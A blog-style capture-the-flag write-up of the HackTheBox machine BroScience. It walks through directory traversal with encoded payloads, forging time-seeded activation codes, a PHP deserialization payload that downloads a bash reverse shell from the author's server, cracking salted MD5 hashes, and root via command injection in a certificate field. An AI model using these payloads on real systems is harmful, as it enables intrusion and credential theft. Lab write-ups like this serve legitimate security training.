---
layout: post
title: "HTB: BroScience"
author: Andrew Cherney
date: 2023-04-09 19:04:59
tags: htb medium-box linux webapp deserialization john 
icon: "assets/icons/broscience.png"
post_description: "During the pentest, I identified multiple vulnerabilities. Firstly, I was able to exploit directory traversal to access sensitive files. Additionally, I leveraged an activation code generating script to create an account and then utilized insecure deserialization to rewrite a class that could download a shell from a webserver I controlled. With the help of hard-coded database credentials, I generated a custom salted wordlist to crack user passwords, and finally, I injected code into a bash script that insecurely used a variable in a command."
---

<h1>ChatGPT Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/BroScience]
└──╼ $nmap -sC 10.10.11.195 -p1-65535
.....
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)
|   256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)
|_  256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)
80/tcp  open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  https
|_http-title: BroScience : Home
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Issuer: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-14T19:48:36
| Not valid after:  2023-07-14T19:48:36
| MD5:   5328 ddd6 2f34 29d1 1d26 ae8a 68d8 6e0c
|_SHA-1: 2056 8d0d 9e41 09cd e5a2 2021 fe3f 349c 40d8 d75b
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       secure flag not set and HTTPS in use
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
```

{% include img_link src="/img/broscience/front_page" alt="front_page" ext="png" trunc=600 %}

<h2>Directory Traversal</h2>

I look at the source code and see that there is an img.php file in /includes where images are referenced through ?path=. I'll try directory traversal with **https://broscience.htb/includes/img.php?path=../../../../etc/passwd** and see what happens.

![directory traversal fail](/img/broscience/attack_fail.png)

Hmm, no dice. Let's urlencode the entire payload a couple times and see what happens. **https://broscience.htb/includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

<h2>Activation Codes</h2>

So we have user bill as our target. I'll look around to see what else I can find. In the file utils.php there is some code to generate the activation code for when you make an account. The code below generates some string based on the time the request is received. 

```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

The time function generates the number of seconds since Unix Epoch, a value I can calculate. Next the packet I send with the registration request will send back a time in the response that I can use to calculate this number. Lastly I can set up a small php script with the exact code above to generate the code for probably some activation.php. 

![date packet](/img/broscience/BroScience_date_packet.png)

From that time I can generate that the time() function would have returned 1677457391. I'll add that to my php code and generate the activation. 

```php
<?php
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
$time = "1677458075";
srand($time);
$activation_code = "";
for ($i = 0; $i < 32; $i++) {
    $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
}
print($activation_code);
?>
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/BroScience]
└──╼ $php time.php 
85JqGNdhlG9NdLgq2JjjJBuXcFIdmy5B
```

I head to **https://broscience.htb/activate.php?code=85JqGNdhlG9NdLgq2JjjJBuXcFIdmy5B** and now my account for the username panda:panda is created. For some reason my other two attempts didn't let me activate. Same method, different result. 

![profile page](/img/broscience/BroScience_profile.png)

After logging in and seeing the profile we have the opportunity to change credentials. The way that's passed to the webapp is: **username=&email=&password=password&id=6**. Now I did a little trolling and set id to 1 and password to password and it locked me out of my account. 

<h1>User as www-data</h1>

<h2>Insecure deserialization</h2>

I looked around for a bit longer and didn't see any foothold or exploit in sight, back to the local file reading. Back in utils.php I came across a cookie name with a value that is deserialized. 

```php
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
```

Maybe I can create some code, encode it in base64, then set it as the cookie named user-prefs? Let's try it, but we'll need to modify this attack a bit to work. Firstly I'll overwrite the class AvatarInterface to be the following:

```php
<?php
class AvatarInterface {
    public $tmp = "http://10.10.14.14:8000/shell.php";
    public $imgPath = "./shell.php"; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$payload = base64_encode(serialize(new AvatarInterface));
echo $payload
?>
```

Then I make the shell I'll retrieve:

```php
<?php
  system("bash -c 'bash -i >& /dev/tcp/10.10.14.14/7777 0>&1'")
?>
```

And then finally set my cookie, setup my http server, and prep my listener. If all this works the way I think it does I should get my shell. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/BroScience]
└──╼ $php payloadgen.php 
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE0LjE0L3NoZWxsLnBocCI7czo3OiJpbWdQYXRoIjtzOjExOiIuL3NoZWxsLnBocCI7fQ==
```
I set my cookie value and then headed to the front page. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/BroScience]
└──╼ $sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.195 - - [26/Feb/2023 19:16:39] "GET /shell.php HTTP/1.0" 200 -
10.10.11.195 - - [26/Feb/2023 19:16:39] "GET /shell.php HTTP/1.0" 200 -
```

And now to head to **https://broscience.htb/shell.php** and get my shell.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/BroScience]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.195] 50184
bash: cannot set terminal process group (1238): Inappropriate ioctl for device
bash: no job control in this shell
www-data@broscience:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<h1>User as bill</h1>

There was a file I didn't read yet named db_connect.php in /includes. Probably has database credentials.

```bash
www-data@broscience:/var/www/html$ cat includes/db_connect.php
cat includes/db_connect.php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
```

```postgresql
www-data@broscience:/var/www$ psql -h localhost -d broscience -U dbuser
psql -h localhost -d broscience -U dbuser
Password for user dbuser: RangeOfMotion%777

\dt
           List of relations
 Schema |   Name    | Type  |  Owner   
--------+-----------+-------+----------
 public | comments  | table | postgres
 public | exercises | table | postgres
 public | users     | table | postgres

select * from users;
 id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
(5 rows)
```

Before I can crack these passwords I need to add the salt from the database. It is cleverly "NaCl" and I need to create a new rockyou list with this at the front.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/BroScience]
└──╼ $sed 's/^/NaCl/' /opt/wordlists/rockyou.txt > saltyou.txt
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/BroScience]
└──╼ $john -w:saltyou.txt brohash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
NaCliluvhorsesandgym (bill)
1g 0:00:00:00 DONE (2023-02-26 19:44) 2.127g/s 15683Kp/s 15683Kc/s 15683KC/s NaCliluvhs..NaCliluvhim1994
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/BroScience]
└──╼ $ssh bill@broscience.htb
.....
bill@broscience:~$ cat user.txt
bf1a81a89b627-------------------
```

<h1>Root</h1>

After digging around I come across **/opt/renew_cert.sh** with the code:

```bash
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

There is a glaring vulnerability here. The commonName is called with a bash command to generate a filename. If I make the commonName something like <code>$(chmod u+s /bin/bash)</code> I can inject a shell. Now the second part to this is I left pspy running and found there was a <code>UID=0     PID=1448   | /bin/bash /opt/renew_cert.sh /home/bill/Certs/broscience.crt</code> running at random intervals.

```bash
bill@broscience:~$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1
Generating a RSA private key
......................................................................................................................................................................++++
.......................................................................................................................................................++++
writing new private key to 'broscience.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)
```

Now I sit back and wait a bit before trying to get a root shell off /bin/bash

```bash
bill@broscience:~/Certs$ /bin/bash -p
bash-5.1# cat /root/root.txt
bc7e3d5f2daf5-------------------
```

